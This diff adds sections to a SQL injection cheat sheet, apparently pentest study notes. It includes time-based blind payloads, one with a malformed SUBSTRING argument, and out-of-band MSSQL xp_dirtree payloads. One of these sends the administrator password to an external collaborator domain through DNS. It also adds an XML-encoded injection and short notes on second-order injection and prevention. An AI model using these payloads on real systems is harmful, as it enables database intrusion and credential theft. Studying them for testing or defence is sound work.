@@ -199,3 +199,49 @@ Using `CAST()` as `int` to generate errors:
 ```sql
 '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 ```
+
+```sql
+' SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(PASSWORD,,1)='')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+USERS--
+```
+
+## Exploiting Blind SQL using OAST (Out-Of-Band) Techniques 
+
+```sql
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+Causes a DNS lookup on a specified domain
+```
+
+```sql
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+Extract credentials using OAST
+```
+
+## SQL Injection in Different Contexts
+
+**Example (XML-based Injection)**
+
+```xml
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> 
+</stockCheck>
+```    
+
+---
+
+## Second-Order SQL Injection
+
+A more subtle and advanced type of SQL injection where **malicious SQL code is stored in the database** and later executed when the application processes the stored data.
+
+- This attack is **delayed**, making detection more difficult.
+    
+- It often bypasses initial validation checks since the payload is executed during a later operation.
+    
+
+---
+
+## How to Prevent SQL Injection
+
+- **Use Parameterized Queries** – Ensures user input is treated as data, not executable SQL.  
+-  **Whitelist Permitted Input Values** – Restricts input to predefined safe values.  
+-  **Implement Alternative Logic** – Modify application logic to achieve required behavior without relying on direct SQL execution.
